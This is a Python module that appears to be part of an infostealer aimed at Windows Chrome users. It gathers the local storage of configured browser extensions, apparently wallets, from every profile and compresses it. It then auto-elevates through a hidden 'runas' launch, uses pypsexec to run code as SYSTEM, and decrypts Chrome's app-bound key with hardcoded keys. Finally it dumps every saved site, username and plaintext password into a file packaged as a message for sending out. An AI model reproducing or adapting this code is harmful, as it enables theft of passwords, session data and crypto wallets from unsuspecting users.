import ctypes
import sys
import time
import os
import json
import binascii
from pypsexec.client import Client
from Crypto.Cipher import AES, ChaCha20_Poly1305
import sqlite3
import pathlib
import shutil
import tempfile
import config
import util

CHROME_USER_DATA_DIR = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data")

def auto_mode_chrome_gather():
    profiles = ["Default"]
    for name in os.listdir(CHROME_USER_DATA_DIR):
        if os.path.isdir(os.path.join(CHROME_USER_DATA_DIR, name)) and name.startswith("Profile"):
            profiles.append(name)

    zipDirectories = []

    for profile in profiles:
        for extension_id in config.EXTENSION_NAMES:
            ext_path = os.path.join(CHROME_USER_DATA_DIR, profile, "Local Extension Settings", extension_id)
            if os.path.exists(ext_path):
                zipDirectories.append(ext_path)

    # test_path = os.path.join(CHROME_USER_DATA_DIR, "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa")
    # zipDirectories.append(test_path)

    compressed_data = util.compress_0501(zipDirectories)

    data = [
        config.LOG_SUCCESS0501.encode(),
        b"gather.tar.gz",
        compressed_data.getvalue()
    ]
    msg_type = config.MSG_FILE0501

    return msg_type, data

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def auto_mode_chrome_cookie():

    if not is_admin():
        # No prompt, just auto-elevate
        command_with_param = " ".join([sys.argv[0]] + sys.argv[1:] + ["-command", "cookie"])
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            command_with_param, None, 0
        )
        if int(ret) <= 32:
            print("[!] User denied elevation. Running as normal user.")
            # Continue normal execution
        else:
            # Successfully relaunched, so exit current process
            sys.exit()
    # Log file
    log_file = os.path.join(os.getcwd(), "chrome_logins_dump.txt")
    with open(log_file, "w", encoding="utf-8") as log:
        log.write("Chrome Saved Logins Dump\n=========================\n")

    # === Decryption Setup ===
    user_profile = os.environ['USERPROFILE']
    user_data_dir = rf"{user_profile}\AppData\Local\Google\Chrome\User Data"
    local_state_path = os.path.join(user_data_dir, "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]

    arguments = "-c \"" + """import win32crypt
    import binascii
    encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
    print(binascii.b2a_base64(encrypted_key[1]).decode())
    """.replace("\n", ";") + "\""

    c = Client("localhost")
    c.connect()

    try:
        c.create_service()
        assert binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB"
        app_bound_encrypted_key_b64 = binascii.b2a_base64(
            binascii.a2b_base64(app_bound_encrypted_key)[4:]
        ).decode().strip()

        encrypted_key_b64, _, _ = c.run_executable(
            sys.executable,
            arguments=arguments.format(app_bound_encrypted_key_b64),
            use_system_account=True
        )
        time.sleep(2)
        decrypted_key_b64, _, _ = c.run_executable(
            sys.executable,
            arguments=arguments.format(encrypted_key_b64.decode().strip()),
            use_system_account=False
        )

        decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
    finally:
        time.sleep(2)
        c.remove_service()
        c.disconnect()

    # AES & ChaCha20 keys (placeholders)
    aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
    chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")

    flag = decrypted_key[0]
    iv = decrypted_key[1:13]
    ciphertext = decrypted_key[13:45]
    tag = decrypted_key[45:]

    if flag == 1:
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
    elif flag == 2:
        cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=iv)
    else:
        raise ValueError(f"Unsupported flag: {flag}")

    key = cipher.decrypt_and_verify(ciphertext, tag)

    # Get Chrome profiles
    profiles = ["Default"]
    for name in os.listdir(user_data_dir):
        if os.path.isdir(os.path.join(user_data_dir, name)) and name.startswith("Profile"):
            profiles.append(name)
    def decrypt_logs_v20(encrypted_value):
        iv = encrypted_value[3:15]
        encrypted = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
        return cipher.decrypt_and_verify(encrypted, tag).decode()

    # Loop through profiles and dump logins
    with open(log_file, "a", encoding="utf-8") as log:
        for profile in profiles:
            log.write(f"\n🧩 Profile: {profile}\n")
            login_db = os.path.join(user_data_dir, profile, "Login Data")

            if not os.path.exists(login_db):
                log.write("⛔ Login Data not found.\n")
                continue

            try:
                # Copy to temporary file
                temp_copy = tempfile.NamedTemporaryFile(delete=False)
                shutil.copy2(login_db, temp_copy.name)
                con = sqlite3.connect(temp_copy.name)
                cur = con.cursor()

                r = cur.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
                rows = cur.fetchall()
                con.close()

                logins_v20 = [row for row in rows if row[2][:3] == b"v20"]

                if not logins_v20:
                    log.write("📭 No v20 logins found.\n")

                for origin, username, password_blob, _ in logins_v20:
                    try:
                        password = decrypt_logs_v20(password_blob)
                        log.write(f"🌐 {origin} | 👤 {username} | 🔑 {password}\n")
                    except Exception as e:
                        log.write(f"❌ Decryption error: {e}\n")

            except Exception as e:
                log.write(f"⚠️ Could not access profile: {e}\n")

    with open(log_file, "rb") as log:
        file_data = log.read()
    data = [
        config.LOG_SUCCESS0501.encode(),
        b"pwd.txt",
        file_data
    ]
    msg_type = config.MSG_FILE0501
    return msg_type, data
